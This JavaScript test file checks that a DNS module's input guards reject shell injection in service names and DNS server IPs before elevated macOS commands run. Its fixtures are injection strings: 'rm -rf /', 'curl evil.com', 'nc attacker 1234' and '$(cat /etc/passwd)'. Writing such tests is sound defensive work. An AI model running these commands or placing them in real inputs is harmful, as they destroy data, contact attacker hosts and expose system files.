"use strict";

/**
 * DNS module tests — validates service name and IP sanitization
 * Tests the assertServiceName and assertIp guards added to prevent
 * shell injection into elevated DNS/IPv6 commands.
 */

const { describe, it, beforeEach, mock } = require("node:test");
const assert = require("node:assert/strict");

// ── Mock elevation module ───────────────────────────────────────────────────
const path = require("path");
const executedCommands = [];
const mockElevatedExec = mock.fn(async (cmd) => {
  executedCommands.push(cmd);
  return "";
});

const elevationPath = path.resolve(__dirname, "../src/elevation.js");
const mockElevatedBatch = mock.fn(async (cmds) => {
  for (const cmd of cmds) executedCommands.push(cmd);
  return { stdout: "", stderr: "" };
});

require.cache[elevationPath] = {
  id: elevationPath,
  filename: elevationPath,
  loaded: true,
  exports: { elevatedExec: mockElevatedExec, elevatedBatch: mockElevatedBatch },
};

const Dns = require("../src/dns");

// ── Helpers ──────────────────────────────────────────────────────────────────
function freshDns(overrides = {}) {
  const d = new Dns();
  d._service = "service" in overrides ? overrides.service : "Wi-Fi";
  d._originalServers = "servers" in overrides ? overrides.servers : ["8.8.8.8", "8.8.4.4"];
  d._ipv6Disabled = overrides.ipv6Disabled || false;
  return d;
}

// ═════════════════════════════════════════════════════════════════════════════
// SERVICE NAME VALIDATION
// ═════════════════════════════════════════════════════════════════════════════
describe("DNS — service name validation", () => {
  beforeEach(() => {
    executedCommands.length = 0;
    mockElevatedExec.mock.resetCalls();
  });

  it("accepts valid service names (Wi-Fi, Ethernet, Thunderbolt Bridge)", async () => {
    for (const svc of ["Wi-Fi", "Ethernet", "Thunderbolt Bridge", "USB 10-100 LAN"]) {
      const d = freshDns({ service: svc });
      if (process.platform === "darwin") {
        await d._applyDarwin();
        assert.ok(executedCommands.length > 0, `Should accept service name: ${svc}`);
      }
      executedCommands.length = 0;
    }
  });

  it("rejects service name with shell injection (semicolon)", async () => {
    const d = freshDns({ service: 'Wi-Fi"; rm -rf /' });
    await assert.rejects(
      () => d._applyDarwin(),
      { message: /Invalid service name/ }
    );
    assert.equal(executedCommands.length, 0);
  });

  it("rejects service name with backtick injection", async () => {
    const d = freshDns({ service: "`curl evil.com`" });
    await assert.rejects(
      () => d._applyDarwin(),
      { message: /Invalid service name/ }
    );
  });

  it("rejects service name with $() subshell", async () => {
    const d = freshDns({ service: "$(whoami)" });
    await assert.rejects(
      () => d._applyDarwin(),
      { message: /Invalid service name/ }
    );
  });

  it("rejects empty service name", async () => {
    const d = freshDns({ service: "" });
    await assert.rejects(
      () => d._applyDarwin(),
      { message: /Invalid service name/ }
    );
  });

  it("rejects null service name", async () => {
    const d = freshDns({ service: null });
    // _applyDarwin should throw on null service
    await assert.rejects(
      () => d._applyDarwin(),
      (err) => err instanceof Error
    );
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// DNS SERVER IP VALIDATION (restore path)
// ═════════════════════════════════════════════════════════════════════════════
describe("DNS — original server IP validation on restore", () => {
  beforeEach(() => {
    executedCommands.length = 0;
    mockElevatedExec.mock.resetCalls();
  });

  it("accepts valid DNS server IPs on restore", async () => {
    const d = freshDns({ servers: ["8.8.8.8", "1.1.1.1"] });
    if (process.platform === "darwin") {
      await d._restoreDarwin();
      assert.ok(executedCommands.length > 0);
      assert.ok(executedCommands[0].includes("8.8.8.8"));
    }
  });

  it("rejects DNS server IP with shell injection on restore", async () => {
    const d = freshDns({ servers: ["8.8.8.8; curl evil.com"] });
    await assert.rejects(
      () => d._restoreDarwin(),
      { message: /Invalid originalDnsServer/ }
    );
    assert.equal(executedCommands.length, 0);
  });

  it("rejects DNS server with pipe injection", async () => {
    const d = freshDns({ servers: ["8.8.8.8 | nc attacker 1234"] });
    await assert.rejects(
      () => d._restoreDarwin(),
      { message: /Invalid originalDnsServer/ }
    );
  });

  it("restores DHCP (empty servers) without validation issue", async () => {
    const d = freshDns({ servers: [] });
    if (process.platform === "darwin") {
      await d._restoreDarwin();
      // Should call with "Empty" argument
      assert.ok(
        executedCommands.some((cmd) => cmd.includes("Empty")),
        "Should restore DHCP DNS"
      );
    }
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// IPv6 SERVICE NAME VALIDATION
// ═════════════════════════════════════════════════════════════════════════════
describe("DNS — IPv6 disable/restore validates service name", () => {
  beforeEach(() => {
    executedCommands.length = 0;
    mockElevatedExec.mock.resetCalls();
  });

  it("disableIpv6Darwin validates service name", async () => {
    const d = freshDns({ service: 'test; echo pwned' });
    await assert.rejects(
      () => d._disableIpv6Darwin(),
      { message: /Invalid service name/ }
    );
  });

  it("restoreIpv6Darwin validates service name", async () => {
    const d = freshDns({ service: '$(cat /etc/passwd)', ipv6Disabled: true });
    await assert.rejects(
      () => d._restoreIpv6Darwin(),
      { message: /Invalid service name/ }
    );
  });

  it("valid service name passes IPv6 disable", async () => {
    const d = freshDns({ service: "Wi-Fi" });
    await d._disableIpv6Darwin();
    assert.ok(d._ipv6Disabled);
    assert.ok(executedCommands.some((cmd) => cmd.includes("setv6off")));
  });
});
